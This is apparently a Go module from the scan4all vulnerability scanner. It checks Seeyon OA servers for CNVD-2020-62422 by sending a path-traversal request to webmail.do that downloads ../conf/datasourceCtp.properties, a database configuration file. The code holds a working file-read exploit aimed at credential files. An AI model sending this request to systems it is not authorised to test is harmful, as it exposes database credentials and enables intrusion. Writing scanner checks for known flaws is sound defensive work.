package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
	"strings"
)

//webmail.do任意文件下载

func CNVD_2020_62422(u string) bool {
	if req, err := pkg.HttpRequset(u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "workflow") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon CNVD_2020_62422|%s\n", u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"))
			return true
		}
	}
	return false
}
